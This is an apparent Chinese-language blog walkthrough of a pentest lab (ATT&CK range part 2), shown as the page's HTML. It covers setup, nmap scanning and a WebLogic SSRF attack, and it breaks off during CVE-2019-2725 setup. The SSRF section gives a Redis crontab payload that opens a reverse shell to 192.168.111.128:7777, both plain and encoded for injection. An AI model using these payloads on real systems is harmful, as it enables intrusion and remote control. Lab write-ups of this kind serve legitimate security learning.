@@ -1,0 +1,637 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>ATT&amp;CK(二) | wanan</title><meta name="keywords" content="靶场,ATT&amp;CK"><meta name="author" content="wanan"><meta name="copyright" content="wanan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ATT&amp;CK(二)环境搭建       还原一下快照    登录web主机 使用密码 de1ay       1qaz@WSX登录进去 进去之后进到这个目录下面,无权限时可以输入 管理员账号密码：Administrator&#x2F;1qaz@WSX C:\Oracle\Middleware\user_projects\domains\base_domain\bin  以管理员身份运行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ATT&amp;CK(二)">
+<meta property="og:url" content="https://www.wanan.red/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91/ATT&CK(%E4%BA%8C)/index.html">
+<meta property="og:site_name" content="wanan">
+<meta property="og:description" content="ATT&amp;CK(二)环境搭建       还原一下快照    登录web主机 使用密码 de1ay       1qaz@WSX登录进去 进去之后进到这个目录下面,无权限时可以输入 管理员账号密码：Administrator&#x2F;1qaz@WSX C:\Oracle\Middleware\user_projects\domains\base_domain\bin  以管理员身份运行">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.pixabay.com/photo/2016/11/06/05/36/lake-1802337_1280.jpg">
+<meta property="article:published_time" content="2022-08-30T06:30:01.655Z">
+<meta property="article:modified_time" content="2022-08-30T06:31:44.035Z">
+<meta property="article:author" content="wanan">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="ATT&amp;CK">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2016/11/06/05/36/lake-1802337_1280.jpg"><link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092159138.jpeg"><link rel="canonical" href="https://www.wanan.red/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91/ATT&amp;CK(%E4%BA%8C)/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="Lkrie_55AalLqll4AtBs-NEomlv8QQYHGMx1V0cbq88"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ATT&CK(二)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-08-30 14:31:44'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092159138.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">82</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">64</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">19</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.pixabay.com/photo/2016/11/06/05/36/lake-1802337_1280.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wanan</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ATT&amp;CK(二)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-08-30T06:30:01.655Z" title="发表于 2022-08-30 14:30:01">2022-08-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-08-30T06:31:44.035Z" title="更新于 2022-08-30 14:31:44">2022-08-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91/">内网</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>15分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ATT&amp;CK(二)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="ATT-amp-CK-二"><a href="#ATT-amp-CK-二" class="headerlink" title="ATT&amp;CK(二)"></a>ATT&amp;CK(二)</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220621212604899.png" alt="image-20220621212604899"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220621211934837.png" alt="image-20220621211934837"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220621174709058.png" alt="image-20220621174709058"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220621174735862.png" alt="image-20220621174735862"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220621174806003.png" alt="image-20220621174806003"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220621181131929.png" alt="image-20220621181131929"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220621195106952.png" alt="image-20220621195106952"></p>
+<p>还原一下快照</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625174145381.png" alt="image-20220625174145381"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625174211710.png" alt="image-20220625174211710"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625174230020.png" alt="image-20220625174230020"></p>
+<p>登录web主机 使用密码 de1ay       1qaz@WSX登录进去</p>
+<p>进去之后进到这个目录下面,无权限时可以输入 管理员账号密码：Administrator&#x2F;1qaz@WSX</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain\bin</span><br></pre></td></tr></table></figure>
+
+<p>以管理员身份运行</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220621200408282.png" alt="image-20220621200408282"></p>
+<p>WEB机和PC机：计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server、Workstation、Computer  Browser 全部启动（Computer Browser 一直自动关闭导致 net view 显示 6118 error  没能解决，在域信息收集时暂时关闭一下防火墙）</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220621211420995.png" alt="image-20220621211420995"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220621212820539.png" alt="image-20220621212820539"></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>收集ip</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.111.2/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220621214555671.png" alt="image-20220621214555671"></p>
+<p>收集80的具体信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -T4 -p- 192.168.111.80</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220621221700966.png" alt="image-20220621221700966"></p>
+<ul>
+<li>445端口开放可能存在smb服务可能还会有ms17-010 端口溢出漏洞</li>
+<li>139端口开放就存在有samba服务可能会有远程命令执行漏洞</li>
+<li>1433端口开放就存在mssql服务有可能存在爆破 注入 sa弱口令</li>
+<li>3389远程桌面服务</li>
+<li>7001端口 weblogic服务</li>
+</ul>
+<h2 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h2><p><a target="_blank" rel="noopener" href="https://github.com/dr0op/WeblogicScan">https://github.com/dr0op/WeblogicScan</a></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622114731263.png" alt="image-20220622114731263"></p>
+<h3 id="weblogic-SSRF"><a href="#weblogic-SSRF" class="headerlink" title="weblogic SSRF"></a>weblogic SSRF</h3><h4 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd vulhub/weblogic/ssrf/</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure>
+
+<p>可以看到开启了连个服务 一个是weblogic 另一个是 redis</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622124555507.png" alt="image-20220622124555507"></p>
+<p>同样我们先扫描一下</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622124923529.png" alt="image-20220622124923529"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622125038532.png" alt="image-20220622125038532"></p>
+<p>我们对operator进行修改操作,发现当端口开放的时候会返回404</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622125129137.png" alt="image-20220622125129137"></p>
+<p>当端口不存在的时候就会显示服务连接不上</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622125218085.png" alt="image-20220622125218085"></p>
+<p>师傅总结的五种状态</p>
+<p><strong>状态一</strong></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/2306050-5a1e620773295dad.png" alt="img"></p>
+<p><strong>状态二</strong></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/2306050-a4fe777c24800708.png" alt="img"></p>
+<p><strong>状态三</strong></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/2306050-ef5c5eb455885253.png" alt="img"></p>
+<p><strong>状态四</strong></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/2306050-dfd388ccf7bac8d8.png" alt="img"></p>
+<p><strong>状态五</strong></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/2306050-435c5a996a51a7d7.png" alt="img"></p>
+<p>首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现172.18.0.2:6379可以连通</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622125917419.png" alt="image-20220622125917419"></p>
+<p>定时任务payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c &#x27;sh -i &gt;&amp; /dev/tcp/192.168.111.128/7777 0&gt;&amp;1&#x27;\n\n\n\n&quot;</span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622131542850.png" alt="image-20220622131542850"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20&#x27;sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.111.128%2F7777%200%3E%261&#x27;%5Cn%5Cn%5Cn%5Cn%22%0Aconfig%20set%20dir%20%2Fetc%2F%0Aconfig%20set%20dbfilename%20crontab%0Asave</span><br></pre></td></tr></table></figure>
+
+<p>替换%0A为%0A%0D</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">strs = <span class="string">&quot;&quot;&quot;set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20&#x27;sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.111.128%2F7777%200%3E%261&#x27;%5Cn%5Cn%5Cn%5Cn%22%0Aconfig%20set%20dir%20%2Fetc%2F%0Aconfig%20set%20dbfilename%20crontab%0Asave&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(strs.replace(<span class="string">&quot;%0A&quot;</span>,<span class="string">&quot;%0A%0D&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>在拼接到redis请求之中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.18.0.2:6379/ww%0A%0D%0A%0Dset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20&#x27;sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.111.128%2F7777%200%3E%261&#x27;%5Cn%5Cn%5Cn%5Cn%22%0A%0Dconfig%20set%20dir%20%2Fetc%2F%0A%0Dconfig%20set%20dbfilename%20crontab%0A%0Dsave</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622132138045.png" alt="image-20220622132138045"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622132202804.png" alt="image-20220622132202804"></p>
+<h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>修改docker-compose.yml，增加8888端口映射</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim docker-compose.yml</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622155709763.png" alt="image-20220622155709763"></p>
+<p>重启docker</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop `docker ps -q`</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>查看id</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>
+
+<p>进入容器</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it 5891c1ca1078  bash</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root/Oracle/Middleware/user_projects/domains/base_domain/bin</span><br><span class="line">vi setDomainEnv.sh</span><br><span class="line"></span><br><span class="line">debugFlag=&quot;true&quot;</span><br><span class="line">export debugFlag</span><br><span class="line">DEBUG_PORT=8888</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622155838105.png" alt="image-20220622155838105"></p>
+<p>重新启动容器</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker restart 5891c1ca1078</span><br></pre></td></tr></table></figure>
+
+<p>获取weblogic的源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp 5891c1ca1078:/root ./weblogic_jars</span><br></pre></td></tr></table></figure>
+
+<p>将所有jar包放到一个目录下面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir weblogic_jars/lib</span><br><span class="line">find ./weblogic_jars -name *.jar -exec cp &#123;&#125; ./weblogic_jars/lib/ \;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622140141533.png" alt="image-20220622140141533"></p>
+<p>idea打开下面的wlserver_10.3</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622161415686.png" alt="image-20220622161415686"></p>
+<p>添加jar包</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622164819665.png" alt="image-20220622164819665"></p>
+<p>添加 jdk</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622164833443.png" alt="image-20220622164833443"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622142311237.png" alt="image-20220622142311237"></p>
+<p>如果不行就把防护墙关了</p>
+<p>这里呢我们要找到正确调试的位置要在反编译的class下面下断点.我们先去看看要调试那个class文件</p>
+<p>查看一个docker的日志</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker logs 5891c1ca1078</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622220616949.png" alt="image-20220622220616949"></p>
+<p>我们找到然后下好断点</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622220701038.png" alt="image-20220622220701038"></p>
+<p>成功接收到了</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622220715115.png" alt="image-20220622220715115"></p>
+<p>这里调试主要关注点是对于operator参数值的传递 从sendMessage函数开始，这里sendMessage接收到operator的参数值</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622222722228.png" alt="image-20220622222722228"></p>
+<p>sendMessage函数中利用BindFactory创建了一个工厂类，又创建了一个BindingInfo对象</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622222631550.png" alt="image-20220622222631550"></p>
+<p>工厂类会通过<code>BindingInfo</code>的内容来决定创建的<code>Bind</code>对象的类型</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622222754823.png" alt="image-20220622222754823"></p>
+<p>这里BindingInfo的getTransport函数默认为http11</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622222901602.png" alt="image-20220622222901602"></p>
+<p>最后工厂类创建的对象为Http11ClientBinding</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622222950769.png" alt="image-20220622222950769"></p>
+<p>通过Http11ClientBinding调用send函数来发起请求，这里可以看出直接向url参数中的地址发起连接，没有进行任何的校验。所以存在CRLF的问题</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220622223024558.png" alt="image-20220622223024558"></p>
+<h3 id="weblogic-CVE-2019-2725"><a href="#weblogic-CVE-2019-2725" class="headerlink" title="weblogic  CVE-2019-2725"></a>weblogic  CVE-2019-2725</h3><h4 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>下载jdk</p>
+<p><a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html#jdk-7u80-oth-JPR">https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html#jdk-7u80-oth-JPR</a></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623085424691.png" alt="image-20220623085424691"></p>
+<p>下载weblogic</p>
+<p><a target="_blank" rel="noopener" href="https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html">https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html</a></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623091043572.png" alt="image-20220623091043572"></p>
+<p>上传上去</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623090247680.png" alt="image-20220623090247680"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxvf jdk-7u80-linux-x64.tar.gz </span><br><span class="line">解压</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623090333153.png" alt="image-20220623090333153"></p>
+<p>记一下解压后的文件名  jdk1.7.0_80</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export JAVA_HOME=/usr/lib/jvm/jdk1.7.0_80</span><br><span class="line">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre</span><br><span class="line">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib</span><br><span class="line">export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim ~/.bashrc</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623090623413.png" alt="image-20220623090623413"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reboot</span><br><span class="line">重启一下</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623090903937.png" alt="image-20220623090903937"></p>
+<p>说明环境配好了</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623091646101.png" alt="image-20220623091646101"></p>
+<p>命令行安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar wls1036_generic.jar -mode=console</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623091729860.png" alt="image-20220623091729860"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623091805277.png" alt="image-20220623091805277"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623091838685.png" alt="image-20220623091838685"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623091906698.png" alt="image-20220623091906698"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root/Oracle/Middleware/wlserver_10.3/common/bin/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623092200879.png" alt="image-20220623092200879"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623092128399.png" alt="image-20220623092128399"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623092416513.png" alt="image-20220623092416513"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623092615763.png" alt="image-20220623092615763"></p>
+<p>修改完之后要输入下一步</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623093250269.png" alt="image-20220623093250269"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623093431477.png" alt="image-20220623093431477"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623093507139.png" alt="image-20220623093507139"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root/Oracle/Middleware/wlserver_10.3/common/lib/n/wanan</span><br><span class="line"> ./startWebLogic.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623093931310.png" alt="image-20220623093931310"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623094042195.png" alt="image-20220623094042195"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.111.129:7001/_async/AsyncResponseService</span><br></pre></td></tr></table></figure>
+
+<p>访问这个目录若返回200表示漏洞存在如果返回404则不存在</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623094235776.png" alt="image-20220623094235776"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.111.129:7001/_async/</span><br></pre></td></tr></table></figure>
+
+<p>访问这个目录若返回403表示漏洞存在,如果返回404表示漏洞不存在</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623094322773.png" alt="image-20220623094322773"></p>
+<p>利用前可以先看下有无wget命令</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623102922964.png" alt="image-20220623102922964"></p>
